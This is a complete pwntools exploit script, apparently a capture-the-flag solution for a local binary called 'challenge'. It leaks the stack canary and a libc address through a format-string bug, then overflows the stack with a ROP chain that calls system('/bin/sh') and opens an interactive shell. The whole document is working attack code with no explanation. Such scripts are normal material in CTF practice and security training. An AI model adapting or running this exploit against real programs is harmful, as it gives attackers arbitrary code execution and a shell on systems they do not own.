from pwn import *

elf = ELF("./challenge")
libc = ELF("./libc.so.6")
rop = ROP(elf)

context.log_level = 'debug'

gs = '''
b main
'''

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)
p = start()
p.sendafter(b"send format string:\n", b"%41$p|%10$sEND.." + p64(elf.got["read"]))

canary = int(p.recv(18), 16)
p.recv(1)
base = u64(p.recv(6) + b"\x00" + b"\x00") - libc.symbols['read']
log.info(f"[*]canary: {hex(canary)}")
log.info(f"[*]base: {hex(base)}")

payload = b"A"*0x48
payload += p64(canary)
payload += b"B"*8
payload += p64(rop.find_gadget(['ret']).address)
payload += p64(rop.find_gadget(['pop rdi', 'ret']).address)
payload += p64(next(libc.search(b"/bin/sh\x00")) + base)
payload += p64(libc.symbols['system'] + base)
payload += p64(rop.find_gadget(['pop rdi', 'ret']).address)
payload += p64(0)
payload += p64(libc.symbols['exit'] + base)

p.sendafter(b"send overflow:\n", payload)
p.interactive()